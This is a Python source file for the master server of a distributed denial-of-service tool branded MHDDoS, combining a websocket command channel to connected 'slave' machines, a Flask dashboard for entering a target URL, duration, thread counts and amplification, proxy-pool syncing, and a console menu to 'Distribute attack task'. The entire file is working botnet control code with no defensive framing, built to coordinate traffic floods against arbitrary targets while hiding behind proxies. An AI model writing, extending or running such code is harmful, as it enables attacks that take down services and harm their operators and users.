import asyncio
import json
import websockets
from collections import defaultdict
from flask import Flask, render_template_string, send_file, request
from flask_socketio import SocketIO, emit
import threading
import os

# Config
HOST = "0.0.0.0"
PORT = 8765

# Store all slave connections and stats
slaves = set()
stats_data = defaultdict(list)
detect_results = dict()

# Web dashboard
app = Flask(__name__)
socketio = SocketIO(app, async_mode='threading')

# Dynamically get payload script list
def get_payload_scripts():
    try:
        return [f for f in os.listdir('payloads') if f.endswith('.py')]
    except Exception:
        return []

dashboard_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>MHDDoS Dashboard</title>
    <script src="https://cdn.socket.io/4.3.2/socket.io.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        body { font-family: Arial; background: #222; color: #eee; }
        h2 { color: #6cf; }
        .slave { margin-bottom: 2em; padding: 1em; background: #333; border-radius: 8px; }
        .protection { color: #ffb347; }
        .chart-container { width: 100%; max-width: 600px; margin: 0 auto; background: #222; }
        .task-form, .proxy-form { background: #444; padding: 1em; border-radius: 8px; margin-bottom: 2em; }
        .task-form label, .proxy-form label { display: inline-block; width: 120px; }
        .task-form input, .task-form select, .proxy-form textarea { margin-bottom: 0.5em; }
        .task-form button, .proxy-form button { background: #6cf; color: #222; border: none; padding: 0.5em 1em; border-radius: 4px; cursor: pointer; }
        .proxy-form textarea { width: 100%; min-height: 80px; background: #222; color: #eee; border: 1px solid #333; border-radius: 4px; }
        .amp-params { display: none; margin-top: 1em; }
        .payload-group { border:1px solid #333; margin-bottom:1em; padding:0.5em; border-radius:6px; background:#333; }
    </style>
</head>
<body>
    <h2>MHDDoS Distributed Attack Real-Time Dashboard</h2>
    <form class="task-form" id="taskForm" onsubmit="return false;">
        <label>Target URL/IP: </label><input type="text" id="url" required><br>
        <label>Duration (seconds):</label><input type="number" id="timer" value="60"><br>
        <label>Simulate Local:</label><select id="simulate_local"><option value="false">No</option><option value="true">Yes</option></select><br>
        <div id="payloadsArea"></div>
        <button type="button" onclick="addPayloadGroup()">Add Protocol/Script</button><br>
        <button type="submit">Start Multi-Protocol/Multi-Payload Task</button>
        <span id="taskResult"></span>
    </form>
    <form class="proxy-form" id="proxyForm" onsubmit="return false;">
        <label>Sync Proxy Pool (one per line):</label><br>
        <textarea id="proxyList"></textarea><br>
        <button type="submit">Sync Proxy Pool to All Slaves</button>
        <span id="proxyResult"></span>
    </form>
    <button onclick="downloadStats()" style="background:#ffb347;color:#222;margin-bottom:1em;">Export Statistics (CSV)</button>
    <div id="slaves"></div>
    <script>
        var socket = io();
        var charts = {};
        var statsHistory = {};
        var payloadScripts = {{ payload_scripts|tojson }};
        function addPayloadGroup() {
            var idx = document.querySelectorAll('.payload-group').length;
            var html = `<div class='payload-group'>
                <label>Protocol Script:</label><select class='payload_script'>`;
            html += `<option value=''>Select</option>`;
            for (var i=0;i<payloadScripts.length;i++) {
                html += `<option value='${payloadScripts[i]}'>${payloadScripts[i]}</option>`;
            }
            html += `</select><br>
                <label>Script Parameters (JSON):</label><input type='text' class='payload_options' placeholder='{"key":"value"}'><br>
                <label>Amplification:</label><input type='number' class='amplification' value='100'><br>
                <label>Thread Ratio (%):</label><input type='number' class='thread_ratio' value='100'><br>
                <button type='button' onclick='this.parentNode.remove()'>Remove</button>
            </div>`;
            document.getElementById('payloadsArea').insertAdjacentHTML('beforeend', html);
        }
        // Add one payload group by default
        window.onload = function() { addPayloadGroup(); };
        document.getElementById('taskForm').onsubmit = function() {
            var url = document.getElementById('url').value;
            var timer = parseInt(document.getElementById('timer').value);
            var simulate_local = document.getElementById('simulate_local').value === 'true';
            var totalThreads = 0;
            var payloadGroups = document.querySelectorAll('.payload-group');
            var payloads = [];
            for (var i=0;i<payloadGroups.length;i++) {
                var g = payloadGroups[i];
                var script = g.querySelector('.payload_script').value;
                if (!script) continue;
                var options = g.querySelector('.payload_options').value;
                var amplification = parseInt(g.querySelector('.amplification').value);
                var thread_ratio = parseInt(g.querySelector('.thread_ratio').value);
                payloads.push({
                    payload_script: script,
                    payload_options: options,
                    amplification: amplification,
                    thread_ratio: thread_ratio
                });
                totalThreads += thread_ratio;
            }
            if (payloads.length === 0) {
                alert('Please select at least one protocol/script');
                return false;
            }
            // Assign total threads (e.g. 10000), distribute by ratio
            var baseThreads = 10000;
            for (var i=0;i<payloads.length;i++) {
                payloads[i].threads = Math.max(1, Math.round(baseThreads * (payloads[i].thread_ratio/100)));
            }
            var task = {
                url: url,
                timer: timer,
                simulate_local: simulate_local,
                payloads: payloads
            };
            socket.emit('task', task);
            document.getElementById('taskResult').innerText = 'Task sent';
            setTimeout(()=>{document.getElementById('taskResult').innerText='';}, 2000);
            return false;
        };
        document.getElementById('proxyForm').onsubmit = function() {
            var proxyList = document.getElementById('proxyList').value.split('\n').map(x=>x.trim()).filter(x=>x);
            socket.emit('proxies', proxyList);
            document.getElementById('proxyResult').innerText = 'Proxy pool synced';
            setTimeout(()=>{document.getElementById('proxyResult').innerText='';}, 2000);
            return false;
        };
        function downloadStats() {
            window.open('/export_stats', '_blank');
        }
        socket.on('update', function(data) {
            let html = '';
            let total_amplified = 0;
            let perPayloadHistory = {};
            for (let slave of data) {
                let slaveId = slave.addr.replace(/[^\w]/g, '_');
                html += `<div class='slave'><b>Slave:</b> ${slave.addr}<br>`;
                html += `<b>Latest Stats:</b> ${JSON.stringify(slave.stats)}<br>`;
                html += `<b>Protection Detection:</b> <span class='protection'>${slave.detect || ''}</span><br>`;
                // Per-protocol/script stats
                if (slave.stats && slave.stats.per_payload) {
                    html += `<div style='margin:0.5em 0;'>`;
                    for (let p of slave.stats.per_payload) {
                        if (!p.payload_script) continue;
                        let pid = slaveId + '_' + p.payload_script.replace(/[^\w]/g,'_');
                        if (!perPayloadHistory[pid]) perPayloadHistory[pid] = [];
                        perPayloadHistory[pid].push({t:p.timestamp,v:p.amplified_bytes});
                        if (perPayloadHistory[pid].length > 60) perPayloadHistory[pid] = perPayloadHistory[pid].slice(-60);
                        html += `<div style='margin-bottom:0.2em;'>`;
                        html += `<b>${p.payload_script}</b> Amplified Traffic: <span style='color:#ffb347;'>${(p.amplified_bytes/1e12).toFixed(3)} TB</span> Threads:${p.threads||''} Amplification:${p.amplification||''}`;
                        html += `<div class='chart-container'><canvas id='chart_${pid}' height='60'></canvas></div>`;
                        html += `</div>`;
                    }
                    html += `</div>`;
                }
                html += `<div class='chart-container'><canvas id='chart_' + slaveId + '' height='120'></canvas></div></div>`;
                if (slave.stats && slave.stats.amplified_bytes) total_amplified += slave.stats.amplified_bytes;
                if (!statsHistory[slaveId]) statsHistory[slaveId] = [];
                if (slave.stats && slave.stats.timestamp) {
                    statsHistory[slaveId].push({
                        t: new Date(slave.stats.timestamp * 1000),
                        v: slave.stats.requests_sent
                    });
                    if (statsHistory[slaveId].length > 60) statsHistory[slaveId] = statsHistory[slaveId].slice(-60);
                }
            }
            document.getElementById('slaves').innerHTML = `<div style='color:#ffb347;font-size:1.2em;'>Current Total Amplified Traffic: ${(total_amplified/1e15).toFixed(3)} PB</div>` + html;
            // Main chart
            for (let slave of data) {
                let slaveId = slave.addr.replace(/[^\w]/g, '_');
                let ctx = document.getElementById('chart_' + slaveId);
                if (!ctx) continue;
                let history = statsHistory[slaveId] || [];
                let labels = history.map(x => x.t.toLocaleTimeString());
                let values = history.map(x => x.v);
                if (!charts[slaveId]) {
                    charts[slaveId] = new Chart(ctx, {
                        type: 'line',
                        data: {
                            labels: labels,
                            datasets: [{
                                label: 'Requests',
                                data: values,
                                borderColor: '#6cf',
                                backgroundColor: 'rgba(102,204,255,0.1)',
                                tension: 0.2
                            }]
                        },
                        options: {
                            plugins: { legend: { display: false } },
                            scales: { x: { display: true }, y: { beginAtZero: true } },
                            animation: false,
                            responsive: true,
                            maintainAspectRatio: false
                        }
                    });
                } else {
                    charts[slaveId].data.labels = labels;
                    charts[slaveId].data.datasets[0].data = values;
                    charts[slaveId].update();
                }
            }
            // Per-protocol/script chart
            for (let pid in perPayloadHistory) {
                let ctx = document.getElementById('chart_' + pid);
                if (!ctx) continue;
                let history = perPayloadHistory[pid] || [];
                let labels = history.map(x => new Date(x.t*1000).toLocaleTimeString());
                let values = history.map(x => x.v/1e12); // TB
                if (!charts[pid]) {
                    charts[pid] = new Chart(ctx, {
                        type: 'line',
                        data: {
                            labels: labels,
                            datasets: [{
                                label: 'Amplified Traffic (TB)',
                                data: values,
                                borderColor: '#ffb347',
                                backgroundColor: 'rgba(255,179,71,0.1)',
                                tension: 0.2
                            }]
                        },
                        options: {
                            plugins: { legend: { display: false } },
                            scales: { x: { display: true }, y: { beginAtZero: true } },
                            animation: false,
                            responsive: true,
                            maintainAspectRatio: false
                        }
                    });
                } else {
                    charts[pid].data.labels = labels;
                    charts[pid].data.datasets[0].data = values;
                    charts[pid].update();
                }
            }
        });
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    payload_scripts = get_payload_scripts()
    return render_template_string(dashboard_html, payload_scripts=payload_scripts)

@app.route('/export_stats')
def export_stats():
    # Support one-click download of simulate_stats.csv
    stats_path = 'simulate_stats.csv'
    if not os.path.exists(stats_path):
        return 'Statistics file does not exist, please run simulate_local to export statistics first', 404
    return send_file(stats_path, as_attachment=True)

# Reserved API: Dynamic task parameter adjustment/hot update
@app.route('/update_task', methods=['POST'])
def update_task():
    # Reserved: Receive new parameters and distribute to all slaves
    # data = request.json
    # TODO: call send_task_to_all(data)
    return {'status':'ok', 'msg':'Task hot update API reserved'}

def push_dashboard():
    while True:
        data = []
        for ws in list(slaves):
            addr = str(getattr(ws, 'remote_address', 'unknown'))
            stats = stats_data[ws][-1] if stats_data[ws] else {}
            detect = detect_results.get(ws, {})
            data.append({
                'addr': addr,
                'stats': stats,
                'detect': detect
            })
        socketio.emit('update', data)
        socketio.sleep(2)

def start_dashboard():
    t = threading.Thread(target=lambda: socketio.run(app, host='0.0.0.0', port=5000), daemon=True)
    t.start()
    socketio.start_background_task(push_dashboard)

async def handle_slave(ws, path):
    slaves.add(ws)
    print(f"Slave connected: {ws.remote_address}")
    try:
        while True:
            msg = await ws.recv()
            try:
                data = json.loads(msg)
                if data.get("type") == "stats":
                    stats_data[ws].append(data["data"])
                    print(f"[Stats] {ws.remote_address}: {data['data']}")
                elif data.get("type") == "done":
                    print(f"[Done] {ws.remote_address}")
                elif data.get("type") == "detect":
                    detect_results[ws] = data["data"]
                    print(f"[Detect] {ws.remote_address}: {data['data']}")
            except Exception as e:
                print(f"Error parsing message from {ws.remote_address}: {e}")
    except websockets.ConnectionClosed:
        print(f"Slave disconnected: {ws.remote_address}")
    finally:
        slaves.discard(ws)
        stats_data.pop(ws, None)
        detect_results.pop(ws, None)

async def send_task_to_all(task):
    if not slaves:
        print("No slaves connected!")
        return
    msg = json.dumps(task)
    await asyncio.gather(*(ws.send(msg) for ws in slaves))
    print(f"Task sent to {len(slaves)} slaves.")

async def send_proxies_to_all(proxy_list):
    if not slaves:
        print("No slaves connected!")
        return
    msg = json.dumps({"type": "proxies", "data": proxy_list})
    await asyncio.gather(*(ws.send(msg) for ws in slaves))
    print(f"Proxy list sent to {len(slaves)} slaves.")

@socketio.on('task')
def handle_web_task(task):
    loop = asyncio.get_event_loop()
    loop.create_task(send_task_to_all(task))

@socketio.on('proxies')
def handle_web_proxies(proxy_list):
    loop = asyncio.get_event_loop()
    loop.create_task(send_proxies_to_all(proxy_list))

async def main():
    print(f"Master listening on ws://{HOST}:{PORT}")
    server = await websockets.serve(handle_slave, HOST, PORT)
    start_dashboard()
    # Command line interaction
    while True:
        print("\n--- Master Console ---")
        print("1. Distribute attack task")
        print("2. View statistics")
        print("3. Exit")
        print("4. Sync proxy pool to all slaves")
        cmd = input("Select operation: ").strip()
        if cmd == "1":
            url = input("Target URL: ").strip()
            method = input("Attack method (e.g. GET): ").strip() or "GET"
            threads = int(input("Threads: ").strip() or "100")
            rpc = int(input("Requests per thread: ").strip() or "1")
            timer = int(input("Duration (seconds): ").strip() or "60")
            proxy_type = int(input("Proxy type (0=ALL,1=HTTP,4=SOCKS4,5=SOCKS5,6=RANDOM): ").strip() or "1")
            proxy_file = input("Proxy filename (e.g. proxies.txt): ").strip() or "proxies.txt"
            task = {
                "url": url,
                "method": method,
                "threads": threads,
                "rpc": rpc,
                "timer": timer,
                "proxy_type": proxy_type,
                "proxy_file": proxy_file
            }
            await send_task_to_all(task)
        elif cmd == "2":
            print("\n--- Statistics ---")
            for ws, stats in stats_data.items():
                print(f"Slave {ws.remote_address}:")
                for s in stats[-5:]:
                    print(f"  {s}")
            print("\n--- Protection Detection ---")
            for ws, det in detect_results.items():
                print(f"Slave {ws.remote_address}: {det}")
        elif cmd == "3":
            print("Exiting master.")
            break
        elif cmd == "4":
            print("Please enter proxy pool content (one per line, type END to finish):")
            proxy_list = []
            while True:
                line = input()
                if line.strip().upper() == "END":
                    break
                if line.strip():
                    proxy_list.append(line.strip())
            await send_proxies_to_all(proxy_list)
        else:
            print("Invalid operation.")
    server.close()
    await server.wait_closed()

if __name__ == "__main__":
    asyncio.run(main())